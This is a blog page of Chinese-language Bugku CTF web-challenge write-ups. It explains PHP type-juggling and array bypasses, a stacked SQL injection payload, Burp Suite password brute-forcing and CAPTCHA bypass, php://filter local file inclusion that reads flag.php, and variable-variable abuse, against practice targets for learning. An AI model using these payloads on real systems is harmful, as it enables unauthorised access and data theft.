+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528220725088.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104358427.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104501313.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104638188.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104715542.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145248163.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145405953.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145504301.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155619788.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155557851.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155646518.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172809843.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172848323.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172926781.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715173106341.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084441132.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084821436.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084903971.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716085249876.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140506785.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140702144.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140834651.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142456628.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142551180.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142642496.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144052143.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144253333.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145651772.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145811973.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716151013505.png">
+<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716153636587.png">
+<meta property="article:published_time" content="2020-07-25T01:16:39.632Z">
+<meta property="article:modified_time" content="2020-07-16T07:45:57.652Z">
+<meta property="article:author" content="zhanqiaozai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211239471.png">
+  
+    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zhanqiaozai</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-bugku" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/bugku/" class="article-date">
+  	<time datetime="2020-07-25T01:16:39.632Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      bugku
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="MD5解密"><a href="#MD5解密" class="headerlink" title="MD5解密"></a>MD5解密</h4><p>复制TVRjMU9UYz0=</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211239471.png" alt="image-20200414211239471"></p>
+<p>进行MD5解密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211307516.png" alt="image-20200414211307516"></p>
+<p>复制MTc1OTc=再次进行解密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211328587.png" alt="image-20200414211328587"></p>
+<p>复制这5位数，填入输入框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211353175.png" alt="image-20200414211353175"></p>
+<h4 id="输入长度限制"><a href="#输入长度限制" class="headerlink" title="输入长度限制"></a>输入长度限制</h4><p>只能输入一个字符</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211642975.png" alt="image-20200414211642975"></p>
+<p>F12查看，发现maxlength限制长度1</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/ca7bdff30672b9b087f28cc4762e102dfbe34616/image-20200414211503349.png" alt="image-20200414211503349"></p>
+<p>更改长度，输入大于1778的数</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211711691.png" alt="image-20200414211711691"></p>
+<p>进行验证</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211718742.png" alt="image-20200414211718742"></p>
+<h4 id="绕过第一个if判断"><a href="#绕过第一个if判断" class="headerlink" title="绕过第一个if判断"></a>绕过第一个if判断</h4><p>查看代码，发现第二个if必须是输入的数字是1才能执行echo输出flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211858576.png" alt="image-20200414211858576"></p>
+<p>输入?num=1，页面没有响应</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211922567.png" alt="image-20200414211922567"></p>
+<p>发现第一个if是!is_numeric，所以输入带上字符的1，比如1”等等</p>
+<p>这样就成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212023379.png" alt="image-20200414212023379"></p>
+<p>解释：因为输入1”第一个if判断不是数字，不执行echo $num，代码向下走，在进行if判断，这里的if判断1”在程序运行时这里的判断不管1后面有没有字符都会当做1来执行，所以成功输出flag</p>
+<h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>payloa：?key=keykeykeykeykeykeykey:///keyx”:i</p>
+<p>查看代码</p>
+<p>发现正则，然后进行匹配</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212253676.png" alt="image-20200414212253676"></p>
+<p>/key                        代表一个key</p>
+<p>.*                            代表一个或多个</p>
+<p>.                              代表一个</p>
+<p>{4,7}                       代表最少4个最多起个</p>
+<p>key                         一个</p>
+<p>/./                        转义中间的.代表一个///</p>
+<p>.*key                      一个或者多个</p>
+<p>[a-z]                       a-z中任意一个字母</p>
+<p>[[:punct:]]             任意一个英文字符</p>
+<p>/i                             一个i</p>
+<p>得出结果输入，成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212821929.png" alt="image-20200414212821929"></p>
+<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>Payload：?number1[]=1&amp;number2[]=2</p>
+<p>查看代码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213304545.png" alt="image-20200414213304545"></p>
+<p>进行分析代码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/V4F8M65%7D%7B%7D%7DAW%60MZI1%7BML0L.png" alt="img"></p>
+<p>需要让第一个判断错误，然后进行下一个判断，md5不能加密数组，所以这里要传一个空数组</p>
+<p>输入上面的Payload，成功返回</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213758327.png" alt="image-20200414213758327"></p>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>查看原页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140146112.png" alt="image-20200512140146112"></p>
+<p>在POST框输入1查看返回什么内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140315871.png" alt="image-20200512140315871"></p>
+<p>使用show database查看所有数据库</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140744730.png" alt="image-20200512140744730"></p>
+<p>查看一下表试一下，返回了，Flag表，发现存在堆叠注入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140828405.png" alt="image-20200512140828405"></p>
+<p>查看PHP代码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512141555352.png" alt="image-20200512141555352"></p>
+<p>可以看到上面的提交语句是这样的这是一种非预期解的方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select &quot;.$post[‘query‘].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>当我们输入1后进行拼接后的语句就是这样的了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>预期解通过堆叠注入将sql_mode的值设置为PIPES_AS_CONCAT，从而将 || 视为字符串的连接操作符而非或运算符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+
+<p>将||或运算变成连接符后就得到了一下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1,flag from Flag&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>查看原页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105117391.png" alt="image-20200522105117391"></p>
+<p>使用admin和admin尝试进行登录。</p>
+<p>返回错误，说用户名和密码不存在。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105325431.png" alt="image-20200522105325431"></p>
+<p>这样一个一个的尝试效率太慢了，我们使用burpsuit进行抓包</p>
+<p>先随机输入密码，进行抓包</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105627840.png" alt="image-20200522105627840"></p>
+<p>将信息发送到intruder模块进行clear$，然后选中password中的值将其Add$</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105936280.png" alt="image-20200522105936280"></p>
+<p>进入Payload子模块，进行载入字典爆破。</p>
+<p>查看字典中的弱口令</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110046142.png" alt="image-20200522110046142"></p>
+<p>在Plyload Options [Simple list]中的load…选中password字典</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110202979.png" alt="image-20200522110202979"></p>
+<p>进行Start attack发动攻击</p>
+<p>得出密码是123456</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110311453.png" alt="image-20200522110311453"></p>
+<p>在页面中输入这个密码，查看是否能够登陆成功</p>
+<p>登陆成功。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110356569.png" alt="image-20200522110356569"></p>
+<h4 id="暴力破解验证码绕过"><a href="#暴力破解验证码绕过" class="headerlink" title="暴力破解验证码绕过"></a>暴力破解验证码绕过</h4><p>原页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110910188.png" alt="image-20200522110910188"></p>
+<p>进行一次登陆试试上面已经知道密码是123456了所以我们现在假装不知道进行绕过</p>
+<p>这里我们输入的是admin，admin</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110953883.png" alt="image-20200522110953883"></p>
+<p>我们进行抓包，将包发送到Repeater模块进行尝试登陆</p>
+<p>点击Go，得到源码，然后右键选中browser，复制网页地址。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111258822.png" alt="image-20200522111258822"></p>
+<p>Copy之后在网页打开试试</p>
+<p>显示登陆失败，验证码也变化了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111439333.png" alt="image-20200522111439333"></p>
+<p>我们将Repeater中得包信息发送到Intruder模块</p>
+<p>将验证码改为当前页面的正确验证码，将字典中的弱口令导入，发动攻击</p>
+<p>得出密码：123456</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112112995.png" alt="image-20200522112112995"></p>
+<p>在页面中使用改密码登录</p>
+<p>登陆成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112156596.png" alt="image-20200522112156596"></p>
+<h4 id="绕过前端验证暴力破解"><a href="#绕过前端验证暴力破解" class="headerlink" title="绕过前端验证暴力破解"></a>绕过前端验证暴力破解</h4><p>还是使用admin和123登录，然后进行抓包，使用弱口令进行爆破</p>
+<p>得出123456密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135328846.png" alt="image-20200522135328846"></p>
+<p>如果我们将抓包里面的验证码更改一下试试</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135409179.png" alt="image-20200522135409179"></p>
+<p>进行发动攻击，还是出来了，说明验证码只是进行了前端验证</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135431754.png" alt="image-20200522135431754"></p>
+<p>在页面中使用密码登录或者在burp中复制然后打开</p>
+<p>登陆成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135839104.png" alt="image-20200522135839104"></p>
+<h3 id="BugkuCTF"><a href="#BugkuCTF" class="headerlink" title="BugkuCTF"></a>BugkuCTF</h3><h4 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212712340.png" alt="image-20200525212712340"></p>
+<p>打开地址查看页面</p>
+<p>页面只有表情，没有任何东西</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212754995.png" alt="image-20200525212754995"></p>
+<p>按F12查看一下源代码</p>
+<p>发现源代码将flag注释了，我们复制提交就可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212841039.png" alt="image-20200525212841039"></p>
+<h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212936523.png" alt="image-20200525212936523"></p>
+<p>原页面，发现有公式输入框，按照将加法的结果写进去试试</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212952887.png" alt="image-20200525212952887"></p>
+<p>74+14=88，发现只能输入一个数字，说明进行了字符长度限制</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213101428.png" alt="image-20200525213101428"></p>
+<p>F12查看代码，可以看到这里做了字符长度限制，只能输入一个字符。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213152555.png" alt="image-20200525213152555"></p>
+<p>将1改为多位数，再次输入正确数值88</p>
+<p>成功显示flag，复制提交就可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213255863.png" alt="image-20200525213255863"></p>
+<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214312273.png" alt="image-20200525214312273"></p>
+<p>打开网址，查看页面</p>
+<p>可以看到GET输入，当$what=flag输出flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214423931.png" alt="image-20200525214423931"></p>
+<p>我们在URL中输入flag，复制提交就可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214724268.png" alt="image-20200525214724268"></p>
+<h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525220028996.png" alt="image-20200525220028996"></p>
+<p>查看页面，可以看到是Post提交，提交方式和Get一样</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525221924026.png" alt="image-20200525221924026"></p>
+<p>在POST中提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222017722.png" alt="image-20200525222017722"></p>
+<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h4><p>打开网页</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222601214.png" alt="image-20200525222601214"></p>
+<p>查看页面</p>
+<p>可以看到只要是不是数字，而且等于1就可以</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222621231.png" alt="image-20200525222621231"></p>
+<p>这里不管1后面加什么都以，但不能在1的前面加。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223421384.png" alt="image-20200525223421384"></p>
+<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223849175.png" alt="image-20200525223849175"></p>
+<p>查看页面，发现一直返回这两个弹框</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223928618.png" alt="image-20200525223928618"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223935748.png" alt="image-20200525223935748"></p>
+<p>按F12 查看源码</p>
+<p>发现一串HTML代码，复制进行解码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225228761.png" alt="image-20200525225228761"></p>
+<p>解码之后得到Key值，复制直接提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225258621.png" alt="image-20200525225258621"></p>
+<h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>这里就是要配置host配置文件，将flag.baidu.com 解析到123.206.87.240然后在网页中访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225744153.png" alt="image-20200525225744153"></p>
+<p>修改hosts文件，路径为<code>C:\Windows\System32\drivers\etc\hosts</code>最底下添加：120.24.86.145     flag.bugku.com  保存 访问即可</p>
+<p>在页面中打开</p>
+<p>成功获取key值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231435886.png" alt="image-20200525231435886"></p>
+<p>还有一种方法就是使用burp抓包添加HOST请求</p>
+<p>直接复制提交就ok，这两种方法都可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231559549.png" alt="image-20200525231559549"></p>
+<h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526075950924.png" alt="image-20200526075950924">查看</p>
+<p>查看原始页面。这是我已经刷新好几次抓到的，刚进去可能没有图片，页面会一直刷新</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080029978.png" alt="image-20200526080029978"></p>
+<p>因为一直刷新所以源码也跟着刷新，根本没机会，所以就可以使用burp进行抓包。</p>
+<p>让页面随机运行一次然后抓包。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080213462.png" alt="image-20200526080213462"></p>
+<p>抓完包发送到Repeater模块中，点击Go一直点击，直到出来flag值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080417167.png" alt="image-20200526080417167"></p>
+<p>或者按F12，然后将burp放旁边只要一出现flag立马打开Intercept is on进行抓包，让页面停止运行，这一种看你反应。</p>
+<p>复制flag提交就可以</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080550190.png" alt="image-20200526080550190"></p>
+<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192157745.png" alt="image-20200607192157745"></p>
+<p>查看源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192302988.png" alt="image-20200607192302988"></p>
+<p>有好几种方法</p>
+<p>在POST区域：<code>f=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p>php://filter/convert.base64-encode/rescoure=flag.php</p>
+<p>会获得base64的加密内容，复制进行解密就可以</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192441288.png" alt="image-20200607192441288"></p>
+<p>还有一种方法直接将flag.php文件读入变量hello中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?hello&#x3D;get_file_contents(&#39;flag.php&#39;) </span><br><span class="line">?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192631186.png" alt="image-20200607192631186"></p>
+<h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084005998.png" alt="image-20200526084005998"></p>
+<p>打开页面得到以下代码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084032873.png" alt="image-20200526084032873"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))		&#x2F;&#x2F;  &#x2F;^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$&#x2F;结尾</span><br><span class="line">    &#123;		</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);		&#x2F;&#x2F;var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计，这里需要知道一个知识点<code>可变变量</code></p>
+<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，实现过程是在变量前面多加美元符号 “$”</p>
+<p>我们的目标是得到flag，由于代码含有正则匹配，文件上传、本地包含等漏洞不能用，而PHP中$GLOBALS[index] 的数组中存储了所有全局变量</p>
+<p>复制提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526083941332.png" alt="image-20200526083941332"></p>
+<h4 id="web-5"><a href="#web-5" class="headerlink" title="web 5"></a>web 5</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085709523.png" alt="image-20200526085709523"></p>
+<p>原始页面，随便提交以下数字试试，发现不行</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085758424.png" alt="image-20200526085758424"></p>
+<p>查看一下源码，发现有一大堆这种JSFUCK代码，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085828992.png" alt="image-20200526085828992"></p>
+<p>复制这些代码，放到控制台中执行，不要忘记复制上去按回车</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090504610.png" alt="image-20200526090504610"></p>
+<p>记住字母要大写，这里给你显示的小写字母，要将字母转换为大写，在你打开前输入flag的地方已经提示了，字母要大写</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090605804.png" alt="image-20200526090605804"></p>
+<p>返回正常，说明正确，复制这个大写字母的flag在BugkuCFT提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090750250.png" alt="image-20200526090750250"></p>
+<h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091427466.png" alt="image-20200526091427466"></p>
+<p>原始页面，发现真的是什么也没有</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091547653.png" alt="image-20200526091547653"></p>
+<p>使用burp抓一下包试试，发送到Repeater，发现flag在请求头中，复制提交。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091710745.png" alt="image-20200526091710745"></p>
+<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><p>打开页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092405600.png" alt="image-20200526092405600"></p>
+<p>原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092432701.png" alt="image-20200526092432701"></p>
+<p>进去之后没什么特别的提示</p>
+<p>但题目说了 实战 经常遇到 </p>
+<p>所以 直接 御剑 跑一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092618994.png" alt="image-20200526092618994"></p>
